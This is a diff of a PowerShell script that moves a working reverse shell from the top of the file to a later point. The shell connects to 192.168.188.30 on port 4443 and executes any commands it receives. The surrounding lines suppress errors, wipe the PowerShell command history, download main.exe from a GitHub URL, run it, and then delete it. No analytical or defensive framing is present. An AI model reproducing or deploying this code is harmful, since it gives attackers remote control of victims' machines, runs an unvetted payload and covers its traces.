@@ -1,23 +1,3 @@
-$client = New-Object System.Net.Sockets.TCPClient('192.168.188.30', 4443)
-$stream = $client.GetStream()
-$bytes = [byte[]](0..65535)
-while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
-    $sendback = (iex $data 2>&1 | Out-String)
-    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
-    $sendbyte = [text.encoding]::ASCII.GetBytes($sendback2)
-    $stream.Write($sendbyte, 0, $sendbyte.Length)
-    $stream.Flush()
-}
-$client.Close()
-
-
-
-
-
-
-
-
 $ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
 $ProgressPreference = 'SilentlyContinue' # Hide all Progresses
 
@@ -586,7 +566,18 @@ if (CHECK_IF_ADMIN -eq $true) {
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 
-
+$client = New-Object System.Net.Sockets.TCPClient('192.168.188.30', 4443)
+$stream = $client.GetStream()
+$bytes = [byte[]](0..65535)
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
+    $sendback = (iex $data 2>&1 | Out-String)
+    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
+    $sendbyte = [text.encoding]::ASCII.GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
 
 $fileUrl = "https://github.com/tayic99373/leave/raw/main/main.exe"
 $tempDir = [System.IO.Path]::GetTempPath()
@@ -601,3 +592,4 @@ $process.Start() | Out-Null
 Start-Sleep -Seconds 120
 
 Remove-Item -Path $filePath -Force
+
